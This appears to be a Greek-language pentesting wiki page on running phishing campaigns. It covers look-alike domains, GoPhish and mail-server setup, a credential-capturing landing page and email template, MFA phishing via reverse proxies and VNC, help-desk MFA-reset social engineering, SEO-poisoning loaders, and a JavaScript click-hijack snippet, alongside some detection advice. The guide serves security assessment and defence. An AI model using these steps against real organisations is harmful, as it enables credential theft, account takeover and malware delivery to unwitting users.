# Μεθοδολογία Phishing

{{#include ../../banners/hacktricks-training.md}}

## Μεθοδολογία

1. Κάντε recon στο θύμα
1. Επιλέξτε το **domain του θύματος**.
2. Εκτελέστε βασικό web enumeration **αναζητώντας login portals** που χρησιμοποιεί το θύμα και **αποφασίστε** ποιο θα **υποδυθείτε**.
3. Χρησιμοποιήστε **OSINT** για να **βρείτε emails**.
2. Προετοιμάστε το περιβάλλον
1. **Αγοράστε το domain** που πρόκειται να χρησιμοποιήσετε για το phishing assessment
2. **Διαμορφώστε τις σχετικές εγγραφές** της email service (SPF, DMARC, DKIM, rDNS)
3. Διαμορφώστε το VPS με **gophish**
3. Προετοιμάστε την καμπάνια
1. Προετοιμάστε το **email template**
2. Προετοιμάστε τη **web page** για την κλοπή των credentials
4. Εκκινήστε την καμπάνια!

## Δημιουργία παρόμοιων domain names ή αγορά trusted domain

### Τεχνικές παραλλαγής Domain Name

- **Keyword**: Το domain name **περιέχει ένα σημαντικό **keyword** του αρχικού domain (π.χ., zelster.com-management.com).<sup>[[1]](#references)</sup>
- **hypened subdomain**: Αλλάξτε την **τελεία σε παύλα** ενός subdomain (π.χ., www-zelster.com).
- **New TLD**: Ίδιο domain με χρήση **νέου TLD** (π.χ., zelster.org)
- **Homoglyph**: **Αντικαθιστά** ένα γράμμα στο domain name με **γράμματα που μοιάζουν οπτικά** (π.χ., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** **Ανταλλάσσει δύο γράμματα** μέσα στο domain name (π.χ., zelsetr.com).
- **Singularization/Pluralization**: Προσθέτει ή αφαιρεί το “s” στο τέλος του domain name (π.χ., zeltsers.com).
- **Omission**: **Αφαιρεί ένα** από τα γράμματα του domain name (π.χ., zelser.com).
- **Repetition:** **Επαναλαμβάνει ένα** από τα γράμματα του domain name (π.χ., zeltsser.com).
- **Replacement**: Όπως το homoglyph, αλλά λιγότερο stealthy. Αντικαθιστά ένα από τα γράμματα του domain name, πιθανώς με ένα γράμμα που βρίσκεται κοντά στο αρχικό γράμμα στο πληκτρολόγιο (π.χ., zektser.com).
- **Subdomained**: Εισάγει μια **τελεία** μέσα στο domain name (π.χ., ze.lster.com).
- **Insertion**: **Εισάγει ένα γράμμα** στο domain name (π.χ., zerltser.com).
- **Missing dot**: Προσθέτει το TLD στο domain name. (π.χ., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

Υπάρχει **πιθανότητα ορισμένα από τα bits που είναι αποθηκευμένα ή βρίσκονται σε επικοινωνία να αναστραφούν αυτόματα** λόγω διαφόρων παραγόντων, όπως ηλιακές εκλάμψεις, κοσμικές ακτίνες ή σφάλματα υλικού.

Όταν αυτή η έννοια **εφαρμόζεται σε DNS requests**, είναι πιθανό το **domain που λαμβάνεται από τον DNS server** να μην είναι το ίδιο με το domain που ζητήθηκε αρχικά.

Για παράδειγμα, μια τροποποίηση ενός bit στο domain "windows.com" μπορεί να το μετατρέψει σε "windnws.com."

Οι Attackers μπορεί να **εκμεταλλευτούν αυτό το γεγονός καταχωρίζοντας πολλαπλά bit-flipping domains** που είναι παρόμοια με το domain του θύματος. Σκοπός τους είναι να ανακατευθύνουν legitimate users στη δική τους infrastructure.

Για περισσότερες πληροφορίες διαβάστε [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/).<sup>[[10]](#references)[[11]](#references)</sup>

### Αγορά trusted domain

Μπορείτε να αναζητήσετε στο [https://www.expireddomains.net/](https://www.expireddomains.net) ένα expired domain που θα μπορούσατε να χρησιμοποιήσετε.\
Για να βεβαιωθείτε ότι το expired domain που πρόκειται να αγοράσετε **έχει ήδη καλό SEO**, μπορείτε να αναζητήσετε πώς κατηγοριοποιείται στα:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Ανακάλυψη Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% δωρεάν)
- [https://phonebook.cz/](https://phonebook.cz) (100% δωρεάν)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

Για να **ανακαλύψετε περισσότερες** έγκυρες email addresses ή να **επαληθεύσετε όσες** έχετε ήδη ανακαλύψει, μπορείτε να ελέγξετε αν μπορείτε να κάνετε brute-force στους SMTP servers του θύματος. [Μάθετε εδώ πώς να επαληθεύετε/ανακαλύπτετε email address](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Επιπλέον, μην ξεχνάτε ότι, αν οι users χρησιμοποιούν **οποιοδήποτε web portal για να έχουν πρόσβαση στα mails τους**, μπορείτε να ελέγξετε αν είναι ευάλωτο σε **username brute force** και να εκμεταλλευτείτε το vulnerability, αν είναι δυνατό.

## Διαμόρφωση του GoPhish

### Εγκατάσταση

Μπορείτε να το κατεβάσετε από [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Κατεβάστε το και αποσυμπιέστε το μέσα στο `/opt/gophish` και εκτελέστε το `/opt/gophish/gophish`\
Θα σας δοθεί ένας κωδικός πρόσβασης για τον admin user στη θύρα 3333, στο output. Επομένως, αποκτήστε πρόσβαση σε αυτήν τη θύρα και χρησιμοποιήστε αυτά τα credentials για να αλλάξετε το admin password. Ίσως χρειαστεί να κάνετε tunnel αυτήν τη θύρα στο local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### Configuration

**Διαμόρφωση πιστοποιητικού TLS**

Πριν από αυτό το βήμα, θα πρέπει να έχετε **ήδη αγοράσει το domain** που πρόκειται να χρησιμοποιήσετε και αυτό να **δείχνει** στη **διεύθυνση IP του VPS** όπου διαμορφώνετε το **gophish**.
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Ρύθμιση Mail**

Ξεκινήστε την εγκατάσταση: `apt-get install postfix`

Στη συνέχεια, προσθέστε το domain στα ακόλουθα αρχεία:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Αλλάξτε επίσης** τις τιμές των ακόλουθων μεταβλητών μέσα στο /etc/postfix/main.cf

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Τέλος, τροποποιήστε τα αρχεία **`/etc/hostname`** και **`/etc/mailname`** ώστε να περιέχουν το domain name σας και **κάντε restart στο VPS.**

Τώρα, δημιουργήστε μια **DNS A record** για το `mail.<domain>` που να δείχνει στη **διεύθυνση IP** του VPS και μια **DNS MX** record που να δείχνει στο `mail.<domain>`

Τώρα ας δοκιμάσουμε να στείλουμε ένα email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Διαμόρφωση του Gophish**

Σταματήστε την εκτέλεση του gophish και ας το διαμορφώσουμε.\
Τροποποιήστε το `/opt/gophish/config.json` ως εξής (σημειώστε τη χρήση του https):
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**Ρύθμιση υπηρεσίας gophish**

Για να δημιουργήσετε την υπηρεσία gophish, ώστε να μπορεί να εκκινείται αυτόματα και να διαχειρίζεται ως υπηρεσία, μπορείτε να δημιουργήσετε το αρχείο `/etc/init.d/gophish` με το ακόλουθο περιεχόμενο:
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
Ολοκληρώστε τη διαμόρφωση της υπηρεσίας και ελέγξτε την κάνοντας:
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## Διαμόρφωση mail server και domain

### Περιμένετε και παραμείνετε νόμιμοι

Όσο παλαιότερο είναι ένα domain, τόσο λιγότερο πιθανό είναι να χαρακτηριστεί ως spam. Επομένως, θα πρέπει να περιμένετε όσο το δυνατόν περισσότερο (τουλάχιστον 1 εβδομάδα) πριν από το phishing assessment. Επιπλέον, αν προσθέσετε μια σελίδα σχετικά με έναν τομέα με καλή φήμη, η φήμη που θα αποκτήσετε θα είναι καλύτερη.

Σημειώστε ότι, ακόμη κι αν πρέπει να περιμένετε μία εβδομάδα, μπορείτε να ολοκληρώσετε τώρα όλη τη διαμόρφωση.

### Διαμόρφωση εγγραφής Reverse DNS (rDNS)

Ορίστε μια εγγραφή rDNS (PTR), η οποία θα επιλύει τη διεύθυνση IP του VPS στο όνομα του domain.

### Εγγραφή Sender Policy Framework (SPF)

Πρέπει να **διαμορφώσετε μια εγγραφή SPF για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή SPF, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#spf).

Μπορείτε να χρησιμοποιήσετε το [https://www.spfwizard.net/](https://www.spfwizard.net) για να δημιουργήσετε την πολιτική SPF (χρησιμοποιήστε την IP του VPS machine).

![Φόρμα SPF Wizard για τη δημιουργία εγγραφής SPF για ένα phishing domain](<../../images/image (1037).png>)

Αυτό είναι το περιεχόμενο που πρέπει να οριστεί μέσα σε μια εγγραφή TXT στο domain:
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### Domain-based Message Authentication, Reporting & Conformance (DMARC) Record

Πρέπει να **διαμορφώσετε μια εγγραφή DMARC για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DMARC, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc).

Πρέπει να δημιουργήσετε μια νέα εγγραφή DNS TXT που να δείχνει στο hostname `_dmarc.<domain>` με το ακόλουθο περιεχόμενο:
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

Πρέπει να **διαμορφώσετε ένα DKIM για το νέο domain**. Αν δεν γνωρίζετε τι είναι μια εγγραφή DMARC, [**διαβάστε αυτήν τη σελίδα**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

Αυτό το tutorial βασίζεται στο: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy).<sup>[[5]](#references)</sup>

> [!TIP]
> Πρέπει να συνενώσετε και τις δύο τιμές B64 που δημιουργεί το κλειδί DKIM:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### Ελέγξτε τη βαθμολογία της διαμόρφωσης email

Μπορείτε να το κάνετε χρησιμοποιώντας το [https://www.mail-tester.com/](https://www.mail-tester.com)\
Απλώς ανοίξτε τη σελίδα και στείλτε ένα email στη διεύθυνση που σας δίνουν:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
Μπορείτε επίσης να **ελέγξετε τη διαμόρφωση του email σας** στέλνοντας ένα email στη διεύθυνση `check-auth@verifier.port25.com` και **διαβάζοντας την απάντηση** (για αυτό θα χρειαστεί να **ανοίξετε** τη θύρα **25** και να δείτε την απάντηση στο αρχείο _/var/mail/root_, αν στείλετε το email ως root).\
Ελέγξτε ότι περνάτε όλες τις δοκιμές:
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
Θα μπορούσατε επίσης να στείλετε **μήνυμα σε ένα Gmail υπό τον έλεγχό σας** και να ελέγξετε τις **κεφαλίδες του email** στα εισερχόμενα του Gmail σας· το `dkim=pass` θα πρέπει να υπάρχει στο πεδίο κεφαλίδας `Authentication-Results`.
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Αφαίρεση από τη Blacklist του Spamhouse

Η σελίδα [www.mail-tester.com](https://www.mail-tester.com) μπορεί να σας ενημερώσει αν το domain σας αποκλείεται από το spamhouse. Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Αφαίρεση από τη Blacklist της Microsoft

​​Μπορείτε να ζητήσετε την αφαίρεση του domain/IP σας στη διεύθυνση [https://sender.office.com/](https://sender.office.com).

## Δημιουργία & εκκίνηση Campaign στο GoPhish

### Sending Profile

- Ορίστε κάποιο **όνομα για την αναγνώριση** του sender profile
- Αποφασίστε από ποιο account θα στείλετε τα phishing emails. Προτάσεις: _noreply, support, servicedesk, salesforce..._
- Μπορείτε να αφήσετε κενά το username και το password, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors

![Δημιουργία & εκκίνηση Campaign στο GoPhish - Sending Profile: Μπορείτε να αφήσετε κενά το username και το password, αλλά βεβαιωθείτε ότι έχετε επιλέξει το Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> Συνιστάται να χρησιμοποιήσετε τη λειτουργία "**Send Test Email**" για να ελέγξετε ότι όλα λειτουργούν.\
> Θα συνιστούσα να **στέλνετε τα δοκιμαστικά emails σε διευθύνσεις email 10min** ώστε να αποφύγετε την καταχώριση σε blacklist κατά τη διάρκεια των δοκιμών.

### Email Template

- Ορίστε κάποιο **όνομα για την αναγνώριση** του template
- Στη συνέχεια γράψτε ένα **subject** (τίποτα περίεργο, απλώς κάτι που θα περιμένατε να διαβάσετε σε ένα κανονικό email)
- Βεβαιωθείτε ότι έχετε επιλέξει το "**Add Tracking Image**"
- Γράψτε το **email template** (μπορείτε να χρησιμοποιήσετε variables όπως στο ακόλουθο παράδειγμα):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Σημειώστε ότι **για να αυξηθεί η αξιοπιστία του email**, συνιστάται να χρησιμοποιήσετε κάποια signature από ένα email του client. Προτάσεις:

- Στείλτε ένα email σε μια **ανύπαρκτη διεύθυνση** και ελέγξτε αν η απάντηση περιέχει signature.
- Αναζητήστε **public emails**, όπως info@ex.com, press@ex.com ή public@ex.com, στείλτε τους ένα email και περιμένετε την απάντηση.
- Προσπαθήστε να επικοινωνήσετε με κάποιο **έγκυρο email που ανακαλύφθηκε** και περιμένετε την απάντηση.

![Sending Profile - Email Template: Προσπαθήστε να επικοινωνήσετε με κάποιο έγκυρο email που ανακαλύφθηκε και περιμένετε την απάντηση](<../../images/image (80).png>)

> [!TIP]
> Το Email Template επιτρέπει επίσης την **επισύναψη αρχείων για αποστολή**. Αν θέλετε επίσης να κλέψετε NTLM challenges χρησιμοποιώντας ειδικά διαμορφωμένα αρχεία/documents, [διαβάστε αυτή τη σελίδα](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Ορίστε ένα **όνομα**
- **Γράψτε τον HTML κώδικα** της web σελίδας. Σημειώστε ότι μπορείτε να **εισάγετε** web pages.
- Επιλέξτε **Capture Submitted Data** και **Capture Passwords**
- Ορίστε μια **ανακατεύθυνση**

![Email Template - Landing Page: Επιλέξτε Capture Submitted Data και Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Συνήθως θα χρειαστεί να τροποποιήσετε τον HTML κώδικα της σελίδας και να κάνετε ορισμένες δοκιμές τοπικά (ίσως χρησιμοποιώντας κάποιο Apache server) **μέχρι να σας ικανοποιούν τα αποτελέσματα.** Στη συνέχεια, γράψτε αυτόν τον HTML κώδικα στο πλαίσιο.\
> Σημειώστε ότι, αν χρειάζεται να **χρησιμοποιήσετε static resources** για το HTML (ίσως ορισμένες CSS και JS pages), μπορείτε να τα αποθηκεύσετε στο _**/opt/gophish/static/endpoint**_ και στη συνέχεια να αποκτήσετε πρόσβαση σε αυτά από το _**/static/\<filename>**_

> [!TIP]
> Για την ανακατεύθυνση μπορείτε να **ανακατευθύνετε τους χρήστες στην legit κύρια web page** του victim ή, για παράδειγμα, να τους ανακατευθύνετε στο _/static/migration.html_, να προσθέσετε κάποιο **spinning wheel (**[**https://loading.io/**](https://loading.io)**) για 5 δευτερόλεπτα και στη συνέχεια να υποδεικνύετε ότι η διαδικασία ολοκληρώθηκε με επιτυχία**.

### Users & Groups

- Ορίστε ένα όνομα
- **Εισαγάγετε τα δεδομένα** (σημειώστε ότι, για να χρησιμοποιήσετε το template του παραδείγματος, χρειάζεστε το firstname, το last name και το email address κάθε user)

![Landing Page - Users & Groups: Εισαγάγετε τα δεδομένα (σημειώστε ότι, για να χρησιμοποιήσετε το template του παραδείγματος, χρειάζεστε το firstname, το last name και το email address κάθε user)](<../../images/image (163).png>)

### Campaign

Τέλος, δημιουργήστε μια campaign επιλέγοντας ένα όνομα, το email template, τη landing page, το URL, το sending profile και το group. Σημειώστε ότι το URL θα είναι ο σύνδεσμος που θα σταλεί στα victims.

Σημειώστε ότι το **Sending Profile επιτρέπει την αποστολή ενός test email, ώστε να δείτε πώς θα φαίνεται το τελικό phishing email**:

![Users & Groups - Campaign: Σημειώστε ότι το Sending Profile επιτρέπει την αποστολή ενός test email, ώστε να δείτε πώς θα φαίνεται το τελικό phishing email](<../../images/image (192).png>)

Μόλις όλα είναι έτοιμα, απλώς ξεκινήστε την campaign!

## Cloning Website

Αν, για οποιονδήποτε λόγο, θέλετε να κάνετε clone τη web page, ελέγξτε την ακόλουθη σελίδα:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

Σε ορισμένα phishing assessments (κυρίως για Red Teams), μπορεί να θέλετε επίσης να **στείλετε αρχεία που περιέχουν κάποιο είδος backdoor** (ίσως ένα C2 ή απλώς κάτι που θα ενεργοποιήσει ένα authentication).\
Δείτε την ακόλουθη σελίδα για ορισμένα παραδείγματα:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Μέσω Proxy MitM

Η προηγούμενη επίθεση είναι αρκετά έξυπνη, καθώς προσποιείστε μια πραγματική web page και συλλέγετε τις πληροφορίες που εισάγει ο user. Δυστυχώς, αν ο user δεν εισήγαγε τον σωστό κωδικό πρόσβασης ή αν η εφαρμογή που προσποιηθήκατε είναι ρυθμισμένη με 2FA, **αυτές οι πληροφορίες δεν θα σας επιτρέψουν να impersonate τον εξαπατημένο user**.

Εδώ είναι χρήσιμα εργαλεία όπως τα [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) και [**muraena**](https://github.com/muraenateam/muraena). Αυτό το εργαλείο σάς επιτρέπει να δημιουργήσετε μια επίθεση τύπου MitM. Βασικά, η επίθεση λειτουργεί ως εξής:

1. **Impersonate τη login** φόρμα της πραγματικής web page.
2. Ο user **στέλνει** τα **credentials** του στη fake page και το εργαλείο τα στέλνει στην πραγματική web page, **ελέγχοντας αν τα credentials λειτουργούν**.
3. Αν ο λογαριασμός είναι ρυθμισμένος με **2FA**, η MitM page θα το ζητήσει και, μόλις ο **user το εισαγάγει**, το εργαλείο θα το στείλει στην πραγματική web page.
4. Μόλις ο user κάνει authentication, εσείς (ως attacker) θα έχετε **captured τα credentials, το 2FA, το cookie και οποιαδήποτε πληροφορία** από κάθε interaction σας, ενώ το εργαλείο εκτελεί MitM.

### Μέσω VNC

Τι θα γινόταν αν, αντί να **στείλετε το victim σε μια malicious page** με την ίδια εμφάνιση με την αρχική, τον στέλνατε σε μια **VNC session με browser συνδεδεμένο στην πραγματική web page**; Θα μπορείτε να δείτε τι κάνει, να κλέψετε τον κωδικό πρόσβασης, το MFA που χρησιμοποιήθηκε, τα cookies...\
Μπορείτε να το κάνετε αυτό με το [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC).<sup>[[3]](#references)[[4]](#references)</sup>

## Εντοπισμός του εντοπισμού

Προφανώς, ένας από τους καλύτερους τρόπους για να γνωρίζετε αν σας έχουν εντοπίσει είναι να **αναζητήσετε το domain σας σε blacklists**. Αν εμφανίζεται στη λίστα, με κάποιον τρόπο το domain σας εντοπίστηκε ως ύποπτο.\
Ένας εύκολος τρόπος για να ελέγξετε αν το domain σας εμφανίζεται σε κάποια blacklist είναι να χρησιμοποιήσετε το [https://malwareworld.com/](https://malwareworld.com)

Ωστόσο, υπάρχουν και άλλοι τρόποι για να γνωρίζετε αν το victim **αναζητά ενεργά ύποπτη phishing δραστηριότητα στο διαδίκτυο**, όπως εξηγείται στο:


{{#ref}}
detecting-phising.md
{{#endref}}

Μπορείτε να **αγοράσετε ένα domain με όνομα πολύ παρόμοιο** με το domain του victim **ή/και να δημιουργήσετε ένα certificate** για ένα **subdomain** ενός domain που ελέγχετε, το οποίο **περιέχει** το **keyword** του domain του victim. Αν το **victim** πραγματοποιήσει οποιοδήποτε είδος **DNS ή HTTP interaction** με αυτά, θα γνωρίζετε ότι **αναζητά ενεργά** ύποπτα domains και θα πρέπει να είστε πολύ stealth.<sup>[[2]](#references)</sup>

### Αξιολόγηση του phishing

Χρησιμοποιήστε το [**Phishious** ](https://github.com/Rices/Phishious)για να αξιολογήσετε αν το email σας θα καταλήξει στον φάκελο spam ή αν θα αποκλειστεί ή θα είναι επιτυχές.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Τα σύγχρονα intrusion sets παρακάμπτουν όλο και περισσότερο τα email lures και **στοχεύουν απευθείας τη ροή εργασίας service-desk / identity-recovery** για να παρακάμψουν το MFA. Η επίθεση είναι πλήρως "living-off-the-land": μόλις ο operator αποκτήσει έγκυρα credentials, κινείται πλευρικά χρησιμοποιώντας ενσωματωμένα admin εργαλεία – δεν απαιτείται malware.<sup>[[6]](#references)</sup>

### Ροή επίθεσης
1. Recon του victim
* Συλλογή προσωπικών και εταιρικών στοιχείων από LinkedIn, data breaches, public GitHub κ.λπ.
* Εντοπισμός identities υψηλής αξίας (executives, IT, finance) και καταγραφή της **ακριβούς διαδικασίας help-desk** για reset κωδικού πρόσβασης / MFA.
2. Social engineering σε πραγματικό χρόνο
* Τηλεφωνήστε, επικοινωνήστε μέσω Teams ή chat με το help-desk, προσποιούμενοι τον target (συχνά με **spoofed caller-ID** ή **cloned voice**).
* Παρέχετε τα PII που συλλέχθηκαν προηγουμένως, ώστε να περάσετε τη knowledge-based verification.
* Πείστε τον agent να **κάνει reset το MFA secret** ή να εκτελέσει **SIM-swap** σε καταχωρημένο mobile number.
3. Άμεσες ενέργειες post-access (≤60 min σε πραγματικές περιπτώσεις)
* Αποκτήστε foothold μέσω οποιουδήποτε web SSO portal.
* Κάντε enumerate το AD / AzureAD με built-ins (χωρίς να αποθέσετε binaries):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement με **WMI**, **PsExec** ή legitimate **RMM** agents που είναι ήδη whitelisted στο environment.

### Detection & Mitigation
* Αντιμετωπίστε το help-desk identity recovery ως **privileged operation** – απαιτήστε step-up auth και manager approval.
* Αναπτύξτε κανόνες **Identity Threat Detection & Response (ITDR)** / **UEBA** που δημιουργούν alert για:
* Αλλαγή MFA method + authentication από νέα συσκευή / geo.
* Άμεση elevation του ίδιου principal (user-→-admin).
* Καταγράφετε τις κλήσεις προς το help-desk και επιβάλετε **call-back σε ήδη καταχωρημένο number** πριν από οποιοδήποτε reset.
* Εφαρμόστε **Just-In-Time (JIT) / Privileged Access**, ώστε οι λογαριασμοί μετά από reset να μην κληρονομούν αυτόματα high-privilege tokens.

---

## Deception σε μεγάλη κλίμακα – SEO Poisoning & “ClickFix” Campaigns
Commodity crews αντισταθμίζουν το κόστος των high-touch operations με μαζικές επιθέσεις που μετατρέπουν τις **μηχανές αναζήτησης και τα ad networks στο κανάλι παράδοσης**.<sup>[[6]](#references)</sup>

1. Το **SEO poisoning / malvertising** προωθεί ένα fake αποτέλεσμα, όπως το `chromium-update[.]site`, στην κορυφή των search ads.
2. Το victim κατεβάζει έναν μικρό **first-stage loader** (συχνά JS/HTA/ISO). Παραδείγματα που παρατηρήθηκαν από την Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Ο loader κάνει exfiltrate τα browser cookies και τα credential DBs και στη συνέχεια κατεβάζει έναν **silent loader**, ο οποίος αποφασίζει – *σε realtime* – αν θα αναπτύξει:
* RAT (π.χ. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Συμβουλές Hardening
* Αποκλείστε newly-registered domains και επιβάλετε **Advanced DNS / URL Filtering** και στα *search-ads* και στο e-mail.
* Περιορίστε την εγκατάσταση software σε signed MSI / Store packages και απαγορεύστε την εκτέλεση `HTA`, `ISO`, `VBS` μέσω policy.
* Παρακολουθείτε child processes των browsers που ανοίγουν installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Αναζητήστε LOLBins που χρησιμοποιούνται συχνά καταχρηστικά από first-stage loaders (π.χ. `regsvr32`, `curl`, `mshta`).

### Hijacking κλικ στο κουμπί Download με TDS handoff
Ορισμένα fake software portals διατηρούν το ορατό `href` του download να δείχνει στο **πραγματικό GitHub/release URL**, αλλά κάνουν hijack την **πρώτη** αλληλεπίδραση του user στη JavaScript και στέλνουν το victim σε μια αλυσίδα **Traffic Distribution System (TDS)** αντί γι’ αυτό.<sup>[[9]](#references)</sup>
```javascript
const cachedOpen = window.open;
document.addEventListener(isChromeDesktop() ? "mousedown" : "click", (e) => {
if (!isEligibleClick(e.target)) return;
cachedOpen(generateRuntimeURL({referrer: location.href, userDestination: extractClickedLink(e.target)}));
e.stopImmediatePropagation();
e.preventDefault();
}, true);
```
Βασικά χαρακτηριστικά:
- Το hook συνήθως εκτελείται στη **capture phase** (`true`) στο `document`, επομένως ενεργοποιείται πριν από τους handlers του site.
- Το Chrome χρησιμοποιεί συχνά `mousedown` αντί για `click`, ώστε να διατηρεί το redirect συνδεδεμένο με μια έγκυρη **user gesture** και να βελτιώνει την παράκαμψη των popup-blockers.
- Ορισμένες παραλλαγές ανοίγουν εκ των προτέρων το `about:blank` ή δημιουργούν clicks σε `<a target="_blank">` και ορίζουν το TDS URL μόνο αργότερα.
